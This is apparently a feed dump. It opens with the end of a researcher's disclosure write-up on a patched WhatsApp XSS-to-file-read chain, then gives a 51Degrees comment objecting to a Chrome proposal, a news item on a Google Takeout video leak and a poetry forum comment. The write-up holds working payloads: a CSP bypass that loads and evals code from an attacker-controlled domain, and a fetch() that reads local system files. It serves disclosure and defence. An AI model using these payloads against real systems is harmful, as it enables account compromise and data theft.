&lt;p&gt;When clicked, the message on native mobile WhatsApp apps normally opens &lt;a href=&quot;https://example.com&quot;&gt;https://example.com&lt;/a&gt; instead of running the XSS (Obviously, because XSS is rarely relevant for native mobile apps).&lt;/p&gt;
&lt;p&gt;Now, I couldn't achieve a state in which the payload is not a visible part of the message. This is because WhatsApp has a part in their code that checks whether the content of the link URI is included in the body of the message when the messages are being loaded. If there is no match, WhatsApp will omit the banner and the exploit won't work. The best I managed to achieve was to create a long enough message, so the &quot;Read more..&quot; feature would turn on, and make sure the actual payload would be at the very bottom of the body of the message where you could only see it if you clicked &quot;Read more..&quot;.&lt;/p&gt;
&lt;p&gt;I had to think of a way to manage to create a very small payload that would load a bigger payload from a different origin, to make the entire thing as unsuspicious as possible. This would mean bypassing WhatsApp's CSP rules, which would not be an easy task.&lt;/p&gt;
&lt;h3&gt;4. Bypassing WhatsApp's CSP rules in order to enhance the power of the Persistent-XSS&lt;/h3&gt;
&lt;p&gt;Bypassing CSP rules is made easier by &lt;a href=&quot;https://csp-evaluator.withgoogle.com/&quot;&gt;Google's CSP Evaluator&lt;/a&gt;. You just throw the URL address of the target website into the text box, and it immediately tells you its CSP configuration and how safe (or unsafe) the website is:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827947/blog/2020/whatsapp-fs-read-vuln-disclosure/6_uedmtf.jpg&quot; alt=&quot;6&quot;/&gt;&lt;/p&gt;
&lt;p&gt;You see that &lt;code class=&quot;language-text&quot;&gt;object-src [missing]&lt;/code&gt; down there? (😈)&lt;/p&gt;
&lt;p&gt;This is what I am going to do. Using my &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; trick, I am going to inject the following payload to my malicious message:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;
  hard_expire_time.innerHTML +=
  '&amp;lt;object data=&quot;https://MY_MALICIOUS_DOMAIN/MY_PAYLOAD_IFRAME.html&quot; /&amp;gt;';
  onmessage=(e)=&amp;gt;{eval(JSON.parse(e.data))};
&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;javascript:&quot;https://facebook.com&quot;;eval(atob(&quot;&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;btoa&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;))&lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;__x_matchedText &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; payload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And the content of &lt;code class=&quot;language-text&quot;&gt;https://MY_MALICIOUS_DOMAIN/MY_PAYLOAD_IFRAME.html&lt;/code&gt; would be:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;html&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;language-html&quot;&gt;
&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;
      top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
      &lt;span class=&quot;token constant&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;stringify&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
      &quot;&lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;'https://facebook.com'&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;'external payload'&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&quot;
      &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token string&quot;&gt;&quot;*&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;See what I just did? Since &lt;code class=&quot;language-text&quot;&gt;object-src&lt;/code&gt; directive is missing, it means I can use &lt;code class=&quot;language-text&quot;&gt;object&lt;/code&gt; to load an iframe(ish) to any origin of my choice. That way I'll be able to run any external code with no size limits and no problems! All that is left to do is to execute that code on &lt;code class=&quot;language-text&quot;&gt;web.whatsapp.com&lt;/code&gt; domain and not on my own iframe's domain, otherwise that'll be pretty useless.&lt;/p&gt;
&lt;p&gt;To achieve that, I simply use the XSS to load the iframe and then listen to the messages that are posted by different windows. I then use the iframe to post a message to the top window with the content of the external code.&lt;/p&gt;
&lt;p&gt;The top window, where the XSS was executed, receives the message from the iframe, parses the external payload provided by it and executes it in its context (&lt;code class=&quot;language-text&quot;&gt;web.whatsapp.com&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Win! External payload was successfully fetched and executed in the context of WhatsApp!&lt;/p&gt;
&lt;p&gt;Oh, and that &lt;code class=&quot;language-text&quot;&gt;hard_expire_time.innerHTML&lt;/code&gt; trick? It was the shortest way I could think of at the moment to make the DOM load my Object element (&lt;code class=&quot;language-text&quot;&gt;hard_expire_time&lt;/code&gt; is an element in the DOM of the website).&lt;/p&gt;
&lt;h3&gt;5. From Persistent-XSS to Reading from the File System on Mac/Windows with a potential for RCE&lt;/h3&gt;
&lt;p&gt;Surprisingly, this is the easy part. WhatsApp has desktop applications for both Mac and Windows.&lt;/p&gt;
&lt;p&gt;I was very skeptical about being able to use the cool XSS I'd found on the desktop applications. After all, they're probably not made of HTML and JS, right?&lt;/p&gt;
&lt;p&gt;I clicked the same malicious message I used on the web app through the Windows desktop application and I was amazed to see this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827946/blog/2020/whatsapp-fs-read-vuln-disclosure/7_fq7lck.jpg&quot; alt=&quot;7&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp Windows Desktop/Mac Desktop/Web)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;WOW! I mean, the &lt;code class=&quot;language-text&quot;&gt;document.domain&lt;/code&gt; part didn't really work - but the &lt;code class=&quot;language-text&quot;&gt;alert()&lt;/code&gt; part sure did! How is that possible?!&lt;/p&gt;
&lt;p&gt;I went online, knowing very well I would find an answer, and this was what I quickly discovered:&lt;/p&gt;
&lt;p&gt;These types of applications are written using &lt;a href=&quot;https://electronjs.org/&quot;&gt;Electron&lt;/a&gt;. Electron is a cool platform that lets you create &quot;native&quot; applications using standard web features. This makes things super easy for a lot of big companies since it allows them to have one source code for both their web applications and native desktop applications. Electron constantly updates along with the platform it is based on: Chromium.&lt;/p&gt;
&lt;p&gt;That means my XSS works since this is - after all - a variant of Chromium!&lt;/p&gt;
&lt;p&gt;But wait, earlier I've learned that my &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; trick doesn't work on Chromium based browsers since the recent patch. So why does this XSS work on Electron?&lt;/p&gt;
&lt;p&gt;I decided to use my XSS to alert the userAgent of the currently running application, and the following major security flaw blew-my-mind:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827946/blog/2020/whatsapp-fs-read-vuln-disclosure/8_ybnb9r.jpg&quot; alt=&quot;8&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp Windows Desktop/Mac Desktop)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;For experienced vulnerability researchers, there is enough data in this alert message to immediately identify the RCE potential, so take a second, and think about it!&lt;/p&gt;
&lt;p&gt;That's right - &lt;code class=&quot;language-text&quot;&gt;Chrome/69&lt;/code&gt; - the latest version of the WhatsApp desktop applications provided by WhatsApp is &lt;code class=&quot;language-text&quot;&gt;Chrome/69&lt;/code&gt; based. This vulnerability was found when &lt;code class=&quot;language-text&quot;&gt;Chrome/78&lt;/code&gt; was the stable version! A few versions before &lt;code class=&quot;language-text&quot;&gt;Chrome/78&lt;/code&gt;, the ability to use the &lt;code class=&quot;language-text&quot;&gt;javascript:&lt;/code&gt; trick was patched, and if WhatsApp would have updated their Electron web application from 4.1.4 to the latest which was 7.x.x at the time this vulnerability was found(!) - this XSS would never have existed!&lt;/p&gt;
&lt;p&gt;And even worse - Since Chromium 69 is relatively old, exploiting a 1-day RCE is possible! There are more than 5 different 1-day RCEs in Chromium 69 or higher, you just need to find a published one and use it through the persistent XSS found earlier and BAM: Remote Code Execution ACHIEVED!&lt;/p&gt;
&lt;p&gt;I did not take the time to actually exploit a public RCE, and therefore didn’t get the chance to prove the existence of such a vulnerability, but the theoretical concept is as follows: if you run an old version of a vulnerable app, one can exploit that vulnerability and do bad things to you. I did however demonstrated how I use &lt;code class=&quot;language-text&quot;&gt;fetch()&lt;/code&gt; API, for example, to read files from the local OS like the content of &lt;code class=&quot;language-text&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; file in this case:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.perimeterx.com/assets-redirect/image/upload/v1580827946/blog/2020/whatsapp-fs-read-vuln-disclosure/9_c40goo.jpg&quot; alt=&quot;9&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This works for WhatsApp Windows Desktop/Mac Desktop)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;For some reason, the CSP rules were not an issue with the Electron based app, so fetching an external payload using a simple javascript resource worked. This is the payload I used the XSS to fetch and execute from my remote malicious server:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;language-javascript&quot;&gt;
&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;navigator&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;userAgent&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        
        &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;fetch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;'file&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; t &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;await&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token function&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;t&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And that was it. This was my full journey, all the way from a simple Open-Redirect, through a Persistent-XSS and a CSP-bypassing to a full Cross Platform Read from the File System plus potentially a Remote-Code-Execution 🎉.&lt;/p&gt;
&lt;h3&gt;Key Takeaways From This Research&lt;/h3&gt;
&lt;p&gt;There are some very serious security flaws here that all companies should learn from:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;If your app uses rich preview banners and those banners are crafted on the sending side, your filtering on the receiving side must be spot on. You just can't let weird URLs load on the receiving side without making sure they're legit. Heck, if your app generally crafts messages on the client side, your filtering on the receiving side must be spot on!&lt;/li&gt;
&lt;li&gt;CSP rules are super important and could have prevented a big part of this mess.If the CSP rules were well configured, the power gained by this XSS would have been much smaller. Being able to bypass the CSP configuration allows an attacker to steal valuable information from the victim, load external payloads easily, and much more!&lt;/li&gt;
&lt;li&gt;If you're going to use Electron, you HAVE to make sure it is updated with each update of Chromium. And this is such a big one - Chromium updates are not just cool new features, in most Chromium updates, serious vulnerabilities are being patched! When Chromium is being updated, your Electron-based app must get updated as well, otherwise you leave your users vulnerable to serious exploits for no good reason!&lt;/li&gt;
&lt;/ol&gt;&lt;h3&gt;Summary&lt;/h3&gt;
&lt;p&gt;And that's pretty much it. I have to admit I've put a lot of effort and time into this research, but I'm glad to say it all paid off. I think there are a few very interesting ideas here that should inspire you to explore new types of security flaws that probably exist out there. I encourage you to go ahead and do that responsibly! And if you're on the other side of the game, please use this article to harden your application. It is 2020, no product should be allowing a full read from the file system and potentially a RCE from a single message.&lt;/p&gt;
&lt;p&gt;Facebook has &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-18426&quot;&gt;patched this CVE&lt;/a&gt;.&lt;/p&gt;

<title>Google tracks individual users per Chrome installation ID</title>
<link>https://github.com/w3ctag/design-reviews/issues/467#issuecomment-581944600</link>
<guid isPermaLink="true" >https://github.com/w3ctag/design-reviews/issues/467#issuecomment-581944600</guid>
<description>&lt;p&gt;Dear Yoav,&lt;/p&gt;
&lt;p&gt;Over the past two weeks we have sought evidence to justify this change. We have found none. None of the industry stakeholders we have spoken to were previously aware of the proposal. This means that the usual and necessary protocols of public review are lacking.&lt;/p&gt;
&lt;p&gt;In its current form this could easily be interpreted as a partisan gerrymandering attempt by the incumbent dominant player in the field, to the disadvantage of other players.&lt;/p&gt;
&lt;p&gt;In our conversations with other players, most recently at the &lt;a href=&quot;https://www.westminsterforumprojects.co.uk/conference/regulation-of-advertising-tech-20&quot; rel=&quot;nofollow&quot;&gt;Westminster Policy Forum&lt;/a&gt;, we found that they thought that this was all part of a cookie discussion. Solicitation of feedback from a wide global cross section of stakeholders via a neutral party is now required. The W3C comes to mind as fulfilling exactly that role.&lt;/p&gt;
&lt;p&gt;This proposal is too radical and has too much potential for disruption to be pushed though quickly, even if you accept the privacy arguments, which we remain unconvinced by.&lt;/p&gt;
&lt;p&gt;Considering purely the macro issues associated with good governance and controlled change we observe the following:&lt;/p&gt;
&lt;ol readability=&quot;5.7339901477833&quot;&gt;&lt;li readability=&quot;7&quot;&gt;
&lt;p&gt;The proposal has not been reviewed beyond a small group of dedicated, focused and elite engineers who in the main add – not take away – excellent features. This change impacts global industry sectors as diverse as publishing, marketing, advertising, technology, charities and more in yet undetermined ways. The risk is equivalent to the Y2K bug.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1.8097251585624&quot;&gt;
&lt;p&gt;Online platforms – and Google in particular – are the subject of a wide ranging &lt;a href=&quot;https://www.gov.uk/cma-cases/online-platforms-and-digital-advertising-market-study&quot; rel=&quot;nofollow&quot;&gt;Competition and Market Authority (CMA) review&lt;/a&gt; covering the subjects of this proposal. The full report is expected to be published on 2nd July 2020. An interim report was published on 18th December 2019. The interim report establishes a balance between the needs of individuals for privacy and for markets and technology to function efficiently. Its conclusions should inform this proposal.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;This proposal will disproportionally benefit Google as in practice it will remove data for smaller platform operators and millions of others. Paragraph 60 appendix E of the CMA review states.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;“Google is the platform with the largest dataset collected from its leading consumer-facing services such as YouTube, Google Maps, Gmail, Android, Google Chrome and from partner sites using Google pixel tags, analytical and advertising services. A Google internal document recognises this advantage saying that ‘Google has more data, of more types, from more sources than anyone else’.”&lt;/p&gt;
&lt;p&gt;The appendix includes the following diagram to illustrate the point.&lt;/p&gt;
&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://user-images.githubusercontent.com/1679482/73481009-dc634180-4392-11ea-810d-370c3de094f0.png&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/1679482/73481009-dc634180-4392-11ea-810d-370c3de094f0.png&quot; alt=&quot;Chromium2&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
&lt;ol start=&quot;4&quot; readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;The CMA are yet to comment on Google’s role in relation to influence over web standards via the Chromium project and other means. Microsoft’s decision to adopt Chromium, and the apparent decline of Firefox are likely to be topics they comment on in July 2020.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;We need more time to discuss the impact with our users. We believe this is true for others.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;As just one example the AdCom specification needs to be updated. Only once this is done can all publishers, SSPs, exchanges and DSPs adopt the new schema. If any of these parties do not make the modifications all are disadvantaged. The change needs to be made in lockstep.&lt;/p&gt;
&lt;p&gt;Many trade bodies and organisations are focused on the implications associated with the publicity concerning 3rd party cookies. They are only just becoming aware of this proposal. We are encouraging them to engage publicly but respect the demands on their time, limited resources and the sensitivities concerning the topic of privacy.&lt;/p&gt;
&lt;p&gt;There are many more arguments concerning assumptions, insufficient evidence, implementation, control over privacy (who decides?), and the technical impacts of the proposal yet to be resolved.&lt;/p&gt;
&lt;p&gt;In summary, this is a change that requires careful and widespread consideration, and a significant effort to socialise for it to be recognised by all as legitimately in the public interest. Without mature reflection and appropriate implementation delay it will be perceived as market manipulation by the incumbent player.&lt;/p&gt;
&lt;p&gt;Regards,&lt;/p&gt;
&lt;p&gt;James Rosewell - for self and 51Degrees&lt;/p&gt;

<title>Some Google Photos videos in backups were sent to strangers in November</title>
<link>https://ww.9to5google.com/2020/02/03/google-photos-video-strangers/</link>
<guid isPermaLink="true" >https://ww.9to5google.com/2020/02/03/google-photos-video-strangers/</guid>
<description>&lt;p&gt;With &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh90HFcuk3E0Uvmek2mbIB5sk20e:ls0g&quot; data-apxy-href=&quot;https://takeout.google.com/&quot;&gt;Google Takeout&lt;/a&gt;, you can download your data from Google apps as a backup or for use with &lt;a href=&quot;https://ww.9to5google.com:443/2018/07/20/google-microsoft-facebook-twitter-data-transfer-project/&quot; data-apxy-href=&quot;https://9to5google.com/2018/07/20/google-microsoft-facebook-twitter-data-transfer-project/&quot;&gt;another service&lt;/a&gt;. Unfortunately, a brief issue with the tool last November saw your videos in Google Photos possibly get exported to strangers’ archives.&lt;/p&gt;
&lt;p&gt;&lt;span id=&quot;more-336737&quot;/&gt;&lt;ins class=&quot;dgvebjrrjoh dxwkru_dg&quot; gdwd-dg-krvw=&quot;ca-host-pub-5506057612223327&quot; gdwd-dg-folhqw=&quot;ca-pub-7114551592991368&quot; data-ad-format=&quot;auto&quot;/&gt; &lt;/p&gt;
&lt;p&gt;Google this evening &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh93m3ldlvEtIPu0UvWekB9hU3WuH3EhjGA5U2WekF1ukwAiU2E5jFualL9djFWuG29dIE9wk29wkPDe:ls0g&quot; data-apxy-href=&quot;https://www.reddit.com/r/security/comments/eyiikp/nice_one_google/&quot;&gt;began&lt;/a&gt; &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh90m2u0mPEhUvWekB9zk25eHvEhjPEyIPDel3AqmQEiUiNhVsZ1VsD3ViphWsp5VMD0WilelPqemP8eVZ:ls0g&quot; data-apxy-href=&quot;https://twitter.com/jonoberheide/status/1224525738268905477/photo/1&quot;&gt;alerting&lt;/a&gt; Takeout users about the “technical issue.” From November 21-25, 2019, those that requested backups could have had videos in Google Photos “incorrectly exported to unrelated users’ archives.”&lt;/p&gt;
&lt;p&gt;In requesting a backup, some of your videos — but not pictures — might be visible to random users that were also downloading their data through Google Takeout. The company did not specify what media was affected beyond “one or more videos in your Google Photos account was affected by this issue.”&lt;/p&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-dnt=&quot;true&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Whoa, what? &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh90m2u0mPEhUvWekB9wk29wkPEfjP90k3V_lvEvG3WhHi10m3WhHhD1AGAvmf:ls0g&quot; data-apxy-href=&quot;https://twitter.com/googlephotos?ref_src=twsrc%5Etfw&quot;&gt;@googlephotos&lt;/a&gt;? &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh90UvWeUiSsFwWKZwxgnPR:ls0g&quot; data-apxy-href=&quot;https://t.co/2cZsABz1xb&quot;&gt;pic.twitter.com/2cZsABz1xb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;— Jon Oberheide (@jonoberheide) &lt;a href=&quot;https://ww.9to5google.com:443/9:jQA0lQV6Uh90m2u0mPEhUvWekB9zk25eHvEhjPEyIPDel3AqmQEiUiNhVsZ1VsD3ViphWsp5VMD0Wil_lvEvG3WhHi10m3WhHhD1AGAvmf:ls0g&quot; data-apxy-href=&quot;https://twitter.com/jonoberheide/status/1224525738268905477?ref_src=twsrc%5Etfw&quot;&gt;February 4, 2020&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Another implication is that the Google Photos archive you downloaded during that five-day period is incomplete and missing some of your videos, while strangers’ media might be present. Google asks users to delete that previous export, and request another one. According to the company, less than 0.01% of Photos users attempting Takeouts were affected, and no other product was affected.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;We recommend you perform another export of your content and delete your prior export at this time.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The underlying issue has been “identified and resolved,” and Google ended the email to affected customers with an apology. &lt;span&gt;Google also provided&lt;/span&gt; &lt;em&gt;9to5Google&lt;/em&gt; &lt;span&gt;with the following comment this evening:&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“We are notifying people about a bug that may have affected users who used Google Takeout to export their Google Photos content between November 21 and November 25. These users may have received either an incomplete archive, or videos—not photos—that were not theirs. We fixed the underlying issue and have conducted an in-depth analysis to help prevent this from ever happening again. We are very sorry this happened.”&lt;/p&gt;
&lt;/blockquote&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;59.892895394502&quot;&gt;&lt;span class=&quot;commtext c00&quot;&gt;Read the 'right' poetry, you'll find the evidence for yourself.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;For me the first piece that spoke to me is When the Frost is on the Punkin by James Whitcomb Riley, that we had to memorize in 7th grade (he's buried here in Indy).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;The first line:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;When the frost is on the punkin and the fodder's in the shock,&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;This immediately triggers fall in my brain. The smell of damp hay and decaying leaves. The morning chill and moisture in the air as the frost begins to quickly melt as the sun comes up.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;The second line:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;And you hear the kyouck and the gobble of the struttin' turkey-cock,&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;If you've ever seen a turkey in person, and heard it start making a fuss, it's a pretty unique sound. They can also be quite flamboyant and arrogant as they strut around a field. I immediately think of that sound, the herky-jerky movements, them posturing to challenge you before they charge.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;Later:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;commtext c00&quot;&gt;&amp;gt;They's somethin kindo' harty-like about the atmusfere&lt;/span&gt;&lt;/p&gt;
